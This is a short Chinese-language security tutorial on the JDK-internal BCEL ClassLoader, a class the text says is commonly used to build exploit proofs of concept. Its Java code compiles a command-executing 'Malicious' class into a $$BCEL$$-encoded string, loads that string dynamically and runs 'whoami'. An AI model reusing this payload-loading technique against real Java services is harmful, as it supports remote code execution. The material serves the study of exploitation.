# 0x01 前言
```plain
com.sun.org.apache.bcel.internal.util.ClassLoader
是常在构造漏洞利用POC时用到的类,因此学会如何使用它很重要
```

# 0x02 版本限制
```plain
Java 8u251之前都可使用BCELClassLoader
```

# 0x03 使用案例
## 0x03.1 系统环境
```plain
系统: MAC
JDK: 1.7
IDEA版本: IntelliJ IDEA 2020.1.4 (Ultimate Edition)
```

## 0x03.2 目录结构
```plain
├── ClassLoader
│   └── BCELClassLoaderTest
│     ├── Malicious.java
│     ├── BCELTest.java
```

## 0x03.3 案例
```java
// 文件路径: ./项目/src/main/java/ClassLoader/BCELClassLoaderTest/Malicious.java
package ClassLoader.BCELClassLoaderTest;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;

public class Malicious {
    public String exec(String cmd) {
        String results = null;
        try {
            // 获取命令执行结果的输入流
            InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[] b = new byte[1024];
            int l = -1;

            // 读取命令执行结果
            while ((l = in.read(b)) != -1) {
                baos.write(b, 0, l);
            }

            // 返回结果
            results = baos.toString();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return results;
    }
}
```

```java
// 文件路径: ./项目/src/main/java/ClassLoader/BCELClassLoaderTest/BCELTest.java
package ClassLoader.BCELClassLoaderTest;

import com.sun.org.apache.bcel.internal.util.ClassLoader;
import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.Utility;

import java.lang.reflect.Method;

public class BCELTest {
    public static void main(String[] args) {
        try {
            // 将恶意类转换成BCEL形式的字节码
            JavaClass javaclass = Repository.lookupClass(Malicious.class);
            // 必须$$BCEL$$开头
            String str = "$$BCEL$$";
            str += Utility.encode(javaclass.getBytes(), true);
            System.out.println("BCEL形式的字节码为: " + str);

            // 使用BCELClassLoader加载类
            Class testClass = new ClassLoader().loadClass(str);

            // 实例化
            Object testInstance = testClass.newInstance();

            // 获取exec方法
            Method method = testClass.getMethod("exec", String.class);

            // 调用exec方法
            String results = (String) method.invoke(testInstance, "whoami");
            System.out.println(results);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```


